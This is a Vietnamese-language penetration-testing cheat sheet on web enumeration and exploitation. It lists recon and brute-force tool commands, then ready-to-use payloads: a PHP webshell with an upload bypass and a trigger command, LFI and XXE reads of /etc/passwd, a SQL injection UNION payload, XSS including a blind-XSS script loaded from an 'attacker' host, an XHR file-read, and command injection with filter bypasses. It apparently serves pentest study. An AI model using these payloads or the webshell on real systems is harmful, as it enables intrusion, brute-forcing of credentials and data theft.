# Web Enumeration & Exploitation (Detailed + Tool Explanation)

## 1. Overview
Web applications là bề mặt tấn công lớn nhất trong pentest.

Các lỗ hổng phổ biến:
- SQL Injection
- XSS
- File Upload → RCE
- SSRF / XXE
- Command Injection

---

## 2. Công cụ sử dụng

### 🔍 EyeWitness
```bash
eyewitness -f subdomains.txt -d output/
```
**Giải thích:**
- Tự động chụp screenshot tất cả web
- Giúp nhanh chóng tìm target interesting

---

### 🔎 Gobuster
```bash
gobuster dir -u http://target -w wordlist.txt -x .php
```
**Giải thích:**
- Brute-force directory/file
- Tìm hidden endpoint như:
  - /admin
  - /upload.php

---

### 🧠 cURL
```bash
curl http://target
```
**Giải thích:**
- Gửi HTTP request thủ công
- Dùng để:
  - Test API
  - Trigger webshell
  - Exploit nhanh

---

### 🔐 Hydra
```bash
hydra -l admin -P passwords.txt target http-post-form
```
**Giải thích:**
- Brute-force login
- Hỗ trợ:
  - SSH
  - FTP
  - HTTP login

---

### 🧪 WPScan
```bash
wpscan -e u -e ap --url http://target
```
**Giải thích:**
- Scan WordPress
- Tìm:
  - user
  - plugin
  - version

---

### 💣 SQLMap
```bash
sqlmap -r request.txt --dbs
```
**Giải thích:**
- Tool auto khai thác SQL Injection
- Dump database nhanh

---

## 3. Các kỹ thuật tấn công

---

### 📁 File Upload → RCE

Upload shell:
```php
<?php system($_GET['cmd']); ?>
```

Bypass:
```
Content-Type: image/png
```

Execute:
```bash
curl http://target/uploads/shell.php?cmd=id
```

---

### 🔓 IDOR

Thay đổi ID:
```
/profile?id=1
/profile?id=2
```

→ Truy cập dữ liệu user khác

---

### 🐞 LFI

```bash
curl "...file.php?file=/etc/passwd"
```

→ Đọc file hệ thống

---

### 💉 SQL Injection

```sql
' UNION SELECT null, database(), user() -- -
```

---

### 🧠 XSS

```html
<script>alert(1)</script>
```

Blind XSS:
```html
<script src=http://attacker/script.js></script>
```

---

### 🌐 SSRF / File Read

```html
<script>
x=new XMLHttpRequest;
x.onload=function(){document.write(this.responseText)};
x.open("GET","file:///etc/passwd");
x.send();
</script>
```

---

### 📦 XXE

```xml
<!DOCTYPE test [
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
```

---

### 💻 Command Injection

```bash
curl "http://target/ping.php?ip=127.0.0.1%0a'id'"
```

Bypass filter:
- %0a → newline
- ${IFS} → space bypass

---

## 4. Tổng kết lỗ hổng

| Kỹ thuật | Mục tiêu |
|--------|--------|
| IDOR | Truy cập data |
| Upload | RCE |
| LFI | Đọc file |
| SQLi | Dump DB |
| XSS | Chiếm session |
| SSRF | Đọc file nội bộ |
| XXE | Đọc file |
| CMD Injection | RCE |
